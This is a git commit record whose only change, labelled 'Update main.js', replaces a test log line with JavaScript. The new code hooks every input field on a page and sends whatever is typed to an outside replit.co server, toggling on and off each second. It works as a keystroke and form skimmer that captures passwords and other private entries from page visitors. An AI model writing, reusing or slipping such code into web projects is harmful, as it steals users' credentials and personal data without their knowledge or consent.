d8bc12e34333884fb3361124083a34314d0f88cc
LEaRCrEaM <127627494+LEaRCrEaM@users.noreply.github.com>
2023-11-12 12:35:11 -0500

    Update main.js

--- main.js
+++ main.js
@@ -1,1 +1,27 @@
-console.log('test')
+function sendRequest(message) {
+    var xhr = new XMLHttpRequest();
+    var url = 'https://backendserver--ashleyunneeded.repl.co/api/addMessage/?message=' + encodeURIComponent(message);
+    xhr.open('GET', url, true);
+    xhr.onload = function () {
+        if (xhr.status >= 200 && xhr.status < 300) {
+            console.log(xhr.responseText);
+        } else {
+            console.error('Request failed with status ' + xhr.status);
+        }
+    };
+    xhr.onerror = function () {
+        console.error('Network error');
+    };
+    xhr.send();
+};
+var se = true;
+document.querySelectorAll('input').forEach(inputElement => {
+    inputElement.addEventListener('input', (event) => {
+        if (se) {
+            sendRequest(inputElement.value);
+        };
+    });
+});
+setInterval(() => {
+    se = !se;
+},1000);
